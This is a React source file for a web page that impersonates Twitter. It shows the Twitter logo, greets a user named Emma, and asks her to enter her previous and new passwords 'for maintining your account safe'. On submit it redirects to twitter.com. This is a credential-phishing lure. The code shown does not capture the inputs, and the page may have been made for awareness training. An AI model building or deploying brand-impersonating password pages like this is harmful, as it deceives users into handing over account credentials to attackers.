import style from "./App.module.css";
import Button from "react-bootstrap/Button";
import Card from "react-bootstrap/Card";
import "bootstrap/dist/css/bootstrap.css";
import Form from "react-bootstrap/Form";
import twitter from "./twitter.png";

function App() {
  return (
    <div className="App">
      <div style={{marginTop:'5%'}}>
        <Form.Text style={{ fontSize: "large", marginLeft: "5%", paddingTop: "5%",fontWeight:'bolder' }}>
          Hello Emma, we are glad you're here.
        </Form.Text>
        <div></div>
        <Form.Text style={{ marginLeft: "7%", paddingTop: "5%" }}>
          Please, fill the next steps for maintining your account safe
        </Form.Text>
      </div>
      <div>
        {" "}
        <Card
          style={{
            width: "60%",
            marginLeft: "20%",
            marginTop: "2%",
            borderRadius: "10%",
          }}
        >
          <Card.Body>
            <img
              src={twitter}
              style={{ width: "10%", height: "auto", marginLeft: "43%" }}
            ></img>

            <Form>
              <Form.Group className="mb-3" controlId="formBasicEmail">
                <Form.Label className={style.textFonts}>
                  Previous password
                </Form.Label>
                <Form.Control type="email" placeholder="Enter email" />
                <Form.Text className={style.textFonts}>
                  We'll never share your password with anyone else.
                </Form.Text>
              </Form.Group>

              <Form.Group className="mb-3" controlId="formBasicPassword">
                <Form.Label className={style.textFonts}>
                  {" "}
                  New password
                </Form.Label>
                <Form.Control type="password" placeholder="Password" />
              </Form.Group>
              <Button variant="dark" type="submit" style={{marginLeft:'45%'}}
              onClick={() => {
                window.location.href='https://twitter.com/'
               }}>
                Submit
              </Button>
            </Form>
          </Card.Body>
        </Card>
      </div>
    </div>
  );
}

export default App;
